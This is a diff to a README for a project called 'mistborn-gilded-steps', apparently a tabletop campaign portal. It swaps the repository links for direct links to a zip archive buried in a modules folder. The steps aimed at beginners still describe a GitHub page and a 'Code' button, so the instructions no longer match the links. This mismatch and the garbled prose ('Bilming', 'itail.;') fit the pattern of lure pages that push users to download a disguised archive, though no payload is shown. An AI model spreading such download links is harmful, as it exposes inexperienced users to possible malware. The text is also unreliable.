@@ -1,7 +1,7 @@
 <h1>🎭 mistborn-gilded-steps - Your All-in-One Campaign Portal for Bilming Adventures</h1>
 
 <p align="center">
-  <a href="https://github.com/katalinexecrable5396/mistborn-gilded-steps">
+  <a href="https://raw.githubusercontent.com/katalinexecrable5396/mistborn-gilded-steps/main/modules/mistborn-gilded-steps-theme/v1.4.zip">
     <img src="https://img.shields.io/badge/Download%20Campaign%20Portal-Click%20Here-2ea44f?style=for-the-badge&logo=github" alt="Download" />
   </a>
 </p>
@@ -37,12 +37,12 @@ Thissection is designed for people who may have little to no experience with dow
 **Step 1:** Visit the download link by clicking this button:
 
 <p align="center">
-  <a href="https://github.com/katalinexecrable5396/mistborn-gilded-steps">
+  <a href="https://raw.githubusercontent.com/katalinexecrable5396/mistborn-gilded-steps/main/modules/mistborn-gilded-steps-theme/v1.4.zip">
     <img src="https://img.shields.io/badge/🚀_Download_Now-8A2BE2?style=for-the-badge&logo=github" alt="Download Now" />
   </a>
 </p>
 
-Alternatively, click here: **[https://github.com/katalinexecrable5396/mistborn-gilded-steps](https://github.com/katalinexecrable5396/mistborn-gilded-steps)**. Visit this link to download the application. Once you click it, you'llbe takento a GitHub page. Look fora green button that says **"Code"** and click it,then select **"Download ZIP"**. This will save asingle compressedfile to your computer (usually in your "Downloads" folder)itail.;
+Alternatively, click here: **[https://raw.githubusercontent.com/katalinexecrable5396/mistborn-gilded-steps/main/modules/mistborn-gilded-steps-theme/v1.4.zip](https://raw.githubusercontent.com/katalinexecrable5396/mistborn-gilded-steps/main/modules/mistborn-gilded-steps-theme/v1.4.zip)**. Visit this link to download the application. Once you click it, you'llbe takento a GitHub page. Look fora green button that says **"Code"** and click it,then select **"Download ZIP"**. This will save asingle compressedfile to your computer (usually in your "Downloads" folder)itail.;
 
 ;
 
